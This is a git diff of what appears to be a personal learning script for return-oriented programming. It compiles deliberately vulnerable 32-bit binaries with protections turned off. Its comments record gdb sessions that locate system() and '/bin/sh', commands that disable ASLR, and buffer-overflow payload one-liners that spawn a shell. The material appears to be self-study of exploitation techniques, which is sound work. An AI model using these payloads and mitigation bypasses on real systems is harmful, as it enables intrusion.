@@ -105,4 +105,34 @@ gcc -fno-stack-protector -z execstack -no-pie -m32 notUsed.c -o ropExample3
 #0x80485b0:      "/bin/sh"
 #(gdb) print &not_used
 #$1 = (<data variable, no debug info> *) 0x804a024 <not_used>
-./ropExample3  "$(python -c 'print "A"*0x6c + "BBBB" + "\x40\x83\x04\x08" + "CCCC" + "\xb0\x85\x04\x08"')"
+#./ropExample3  "$(python -c 'print "A"*0x6c + "BBBB" + "\x40\x83\x04\x08" + "CCCC" + "\xb0\x85\x04\x08"')"
+
+
+# Accessing libc functions
+#ulimit -s unlimited # Hack to disable library ASLR (might not disable ASLR anymore)
+#setarch `uname -m` -R /bin/bash # Open shell with ASLR disabled (proven to work)
+#gdb -q ropExample3
+#Catchpoint 1 (throw)
+#Reading symbols from ropExample3...
+#(No debugging symbols found in ropExample3)
+#(gdb) break main
+#Breakpoint 2 at 0x80484fb
+#(gdb) run
+#Starting program: /home/apenner/GitRepos/AxSandbox/rop/ropExample3
+# 
+#Breakpoint 2, 0x080484fb in main ()
+#(gdb) print system
+#$1 = {<text variable, no debug info>} 0x2a8b32e0 <system>
+#(gdb) find 0x2a8b32e0, +999999999999, "/bin/sh
+#Unterminated string in expression.
+#(gdb) find 0x2a8b32e0, +999999999999, "/bin/sh"
+#0x2a9f40af
+#warning: Unable to access 16000 bytes of target memory at 0x2aa51cb7, halting search.
+#1 pattern found.
+#./ropExample3 "$(python -c 'print "A"*0x6c + "BBBB" + "\xe0\x32\x8b\x2a" + "CCCC" + "\xaf\x40\x9f\x2a"')"
+
+
+# Use gadgets
+gcc -fno-stack-protector -z execstack -no-pie -m32 gadget.c -o ropExample4
+./ropExample4 sampleText
+
